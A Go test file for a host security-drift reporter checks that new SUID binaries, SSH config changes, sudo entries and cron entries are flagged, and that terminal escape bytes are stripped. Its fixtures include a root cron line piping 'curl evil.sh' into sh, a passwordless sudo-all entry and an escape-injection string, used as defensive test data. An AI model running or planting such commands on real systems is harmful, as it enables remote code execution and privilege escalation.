package cmd

import (
	"strings"
	"testing"
	"time"

	"github.com/keyorixhq/dashdiag/internal/baseline"
	"github.com/keyorixhq/dashdiag/internal/output"
)

// Golden-output tests for printSecurityDrift (0% covered).

func TestPrintSecurityDriftNewSUIDIsCritical(t *testing.T) {
	diff := &baseline.SecurityDiff{
		NewSUIDs:        []string{"/tmp/evil"},
		BaselineSavedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC),
	}
	out := captureStdout(t, func() { printSecurityDrift(diff, output.ModePlain) })
	if !strings.Contains(out, "/tmp/evil") {
		t.Errorf("a new SUID binary should be named, got:\n%s", out)
	}
	if !strings.Contains(out, "CRITICAL drift") {
		t.Errorf("a new SUID binary is the most serious drift class and must escalate the summary to CRITICAL, got:\n%s", out)
	}
}

// TestPrintSecurityDriftStripsControlChars guards terminal escape injection:
// a new cron entry can come from another user's crontab (attacker-writable
// if that user is compromised), and must not carry raw control bytes into
// the terminal.
func TestPrintSecurityDriftStripsControlChars(t *testing.T) {
	diff := &baseline.SecurityDiff{
		NewCronEntries:  []string{"* * * * * root evil\x1b]0;pwned\x07"},
		BaselineSavedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC),
	}
	out := captureStdout(t, func() { printSecurityDrift(diff, output.ModePlain) })
	if strings.Contains(out, "\x1b") {
		t.Errorf("printSecurityDrift output still contains ESC byte:\n%s", out)
	}
	if !strings.Contains(out, "evil]0;pwned") {
		t.Errorf("printSecurityDrift output missing sanitized cron entry:\n%s", out)
	}
}

func TestPrintSecurityDriftSSHChanges(t *testing.T) {
	diff := &baseline.SecurityDiff{
		ChangedSSHFiles: []string{"/etc/ssh/sshd_config"},
		AddedSSHFiles:   []string{"/etc/ssh/sshd_config.d/99-evil.conf"},
		RemovedSSHFiles: []string{"/etc/ssh/sshd_config.d/10-hardening.conf"},
		BaselineSavedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC),
	}
	out := captureStdout(t, func() { printSecurityDrift(diff, output.ModePlain) })
	if !strings.Contains(out, "sshd_config") || !strings.Contains(out, "modified since baseline") {
		t.Errorf("a changed SSH config file should be named, got:\n%s", out)
	}
	if !strings.Contains(out, "99-evil.conf") || !strings.Contains(out, "added since baseline") {
		t.Errorf("a newly added SSH config file should be flagged, got:\n%s", out)
	}
	if !strings.Contains(out, "10-hardening.conf") || !strings.Contains(out, "removed since baseline") {
		t.Errorf("a removed hardening drop-in should be flagged (an attacker could delete it), got:\n%s", out)
	}
	// No new SUID present — must not escalate to CRITICAL.
	if strings.Contains(out, "CRITICAL") {
		t.Errorf("SSH-only drift (no new SUID) should stay WARN, not escalate to CRITICAL, got:\n%s", out)
	}
}

func TestPrintSecurityDriftSudoAndCron(t *testing.T) {
	diff := &baseline.SecurityDiff{
		NewSudoEntries:  []string{"deploy ALL=(ALL) NOPASSWD: ALL"},
		NewCronEntries:  []string{"* * * * * root curl evil.sh | sh"},
		BaselineSavedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC),
	}
	out := captureStdout(t, func() { printSecurityDrift(diff, output.ModePlain) })
	if !strings.Contains(out, "deploy ALL") {
		t.Errorf("a new sudo NOPASSWD entry should be shown, got:\n%s", out)
	}
	if !strings.Contains(out, "curl evil.sh") {
		t.Errorf("a new suspect cron entry should be shown, got:\n%s", out)
	}
	if !strings.Contains(out, "2 security change(s)") {
		t.Errorf("the change count should sum both categories, got:\n%s", out)
	}
}
